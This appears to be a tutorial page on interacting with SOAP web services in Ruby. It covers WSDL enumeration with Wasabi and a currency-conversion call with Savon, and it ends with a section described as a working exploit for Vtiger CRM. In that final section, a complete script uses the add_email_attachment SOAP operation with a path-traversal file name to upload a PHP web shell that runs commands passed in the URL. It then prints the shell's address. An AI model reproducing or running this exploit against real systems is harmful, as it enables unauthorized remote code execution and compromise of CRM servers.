# Interacting with Web Services

### SOAP - WSDL
Generally speaking, dealing with SOAP means dealing with XMLs that which WSDL describes how to use that SOAP. Ruby has really elegant way to do so and let's to get our hand dirty with an exploit

```
gem install wasabi savon httpclient 
```

#### Enumeration

```ruby
require 'wasabi'

url = "http://www.webservicex.net/CurrencyConvertor.asmx?WSDL"

document = Wasabi.document url

# Parsing the document 
document.parser

# SOAP XML
document.xml

# Getting the endpoint 
document.endpoint

# Getting the target namespace
document.namespace

# Enumerate all the SOAP operations/actions
document.operations

# Enumerate input parameters for particular operation
document.operation_input_parameters :conversion_rate

# Enumerate all available currencies 
document.parser.document.element_children.children[1].children[1].children[3].children[1].children.map {|c| c.attributes.values[0].to_s}

```

Results

```ruby
>> url = "http://www.webservicex.net/CurrencyConvertor.asmx?WSDL"
=> "http://www.webservicex.net/CurrencyConvertor.asmx?WSDL"
>> document = Wasabi.document url
=> #<Wasabi::Document:0x00000002c79a50 @adapter=nil, @document="http://www.webservicex.net/CurrencyConvertor.asmx?WSDL">
>> # Parsing the document 
>> document.parser
=> #<Wasabi::Parser:0x0000000281ebb8
 @deferred_types=[],
 @document=
  #(Document:0x140fa3c {
    name = "document",
    children = [
      #(Element:0x140f294 {
        name = "definitions",
        namespace = #(Namespace:0x14017e8 { prefix = "wsdl", href = "http://schemas.xmlsoap.org/wsdl/" }),
        attributes = [ #(Attr:0x1a507d4 { name = "targetNamespace", value = "http://www.webserviceX.NET/" })],
        children = [
          #(Text "\n  "),
---kipped---
>> # Getting the endpoint 
>> document.endpoint
=> #<URI::HTTP http://www.webservicex.net/CurrencyConvertor.asmx>
>> # Getting the target namespace
>> document.namespace
=> "http://www.webserviceX.NET/"
>> # Enumerate all the SOAP operations/actions
>> document.operations
=> {:conversion_rate=>
  {:action=>"http://www.webserviceX.NET/ConversionRate",
   :input=>"ConversionRate",
   :output=>"ConversionRateResponse",
   :namespace_identifier=>"tns",
   :parameters=>{:FromCurrency=>{:name=>"FromCurrency", :type=>"Currency"}, :ToCurrency=>{:name=>"ToCurrency", :type=>"Currency"}}}}
>> # Enumerate input parameters for particular operation
>> document.operation_input_parameters :conversion_rate
=> {:FromCurrency=>{:name=>"FromCurrency", :type=>"Currency"}, :ToCurrency=>{:name=>"ToCurrency", :type=>"Currency"}}
```

#### Interaction 

```ruby
require 'savon'

url = "http://www.webservicex.net/CurrencyConvertor.asmx?WSDL"
client = Savon.client(wsdl: url)

message = {'FromCurrency' => 'EUR', 'ToCurrency' => 'CAD'}
response = client.call(:conversion_rate, message: message).body

response[:conversion_rate_response][:conversion_rate_result]
```

Results

```ruby
>> message = {'FromCurrency' => 'EUR', 'ToCurrency' => 'CAD'}
=> {"FromCurrency"=>"EUR", "ToCurrency"=>"CAD"}
>> response = client.call(:conversion_rate, message: message).body
=> {:conversion_rate_response=>{:conversion_rate_result=>"1.4417", :@xmlns=>"http://www.webserviceX.NET/"}}

1.4415
```


#### Hacking via SOAP vulnerabilities 

This is a working exploit for Vtiger CRM SOAP from Auth-bypass to Shell upload 
```ruby
#!/usr/bin/evn ruby
# KING SABRI | @KINGSABRI
# gem install savon httpclient
#
require 'savon'

if ARGV.size < 1
  puts "[+] ruby #{__FILE__} [WSDL URL]"
  exit 0
else
  url = ARGV[0]
end

shell_data, shell_name = "<?php system($_GET['cmd']); ?>", "shell-#{rand(100)}.php"

# Start client 
client = Savon::Client.new(wsdl: url)

# List all avialable operations 
puts "[*] List all available operations "
puts client.operations

puts "\n\n[*] Interact with :add_email_attachment operation"
response = client.call( :add_email_attachment, 
                        message: {
                                     emailid:  rand(100),
                                     filedata: [shell_data].pack("m0"),
                                     filename: "../../../../../../#{shell_name}",
                                     filesize: shell_data.size,
                                     filetype: "php",
                                     username: "KING", 
                                     sessionid: nil
                                }
                      )
puts "[+] PHP Shell on:  http://#{URI.parse(url).host}/vtigercrm/soap/#{shell_name}?cmd=id"

```
More about [Savon][1]





document.parser.document.element_children.children[1].children[1].children[3].children[1].children[1].attributes.values[0].to_s




<br><br><br>
---
[1]: http://savonrb.com/

